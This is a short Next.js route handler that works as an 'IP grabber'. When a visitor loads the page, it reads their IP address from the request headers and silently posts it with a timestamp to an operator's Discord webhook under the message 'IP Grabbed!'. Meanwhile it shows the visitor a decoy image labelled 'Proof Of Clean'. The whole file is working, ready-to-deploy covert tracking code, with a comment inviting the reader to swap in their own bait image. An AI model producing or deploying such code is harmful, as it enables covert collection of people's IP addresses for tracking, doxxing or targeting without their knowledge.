import { NextResponse } from 'next/server';

export async function GET(request: Request) {
  // 1. Get the IP
  const ip = request.headers.get('x-forwarded-for') || 
             request.headers.get('x-real-ip') || 
             'unknown';

  // 2. Send to Discord
  const webhookUrl = process.env.DISCORD_WEBHOOK;
  
  if (webhookUrl) {
    try {
      await fetch(webhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          content: `🕵️ **IP Grabbed!**\nIP: \`${ip}\`\nTime: ${new Date().toISOString()}`
        })
      });
    } catch (e) {
      console.error("Webhook fail", e);
    }
  }

  // 3. Return a simple HTML page with an image
  return new NextResponse(`
    <html>
      <body style="display:flex;justify-content:center;align-items:center;height:100vh;background:#1a1a1a;">
        <!-- Replace this URL with your own image link if you want -->
        <img src="https://via.placeholder.com/500x500.png?text=Proof+Of+Clean" width="300" />
      </body>
    </html>
  `, {
    headers: { 'Content-Type': 'text/html' }
  });
}
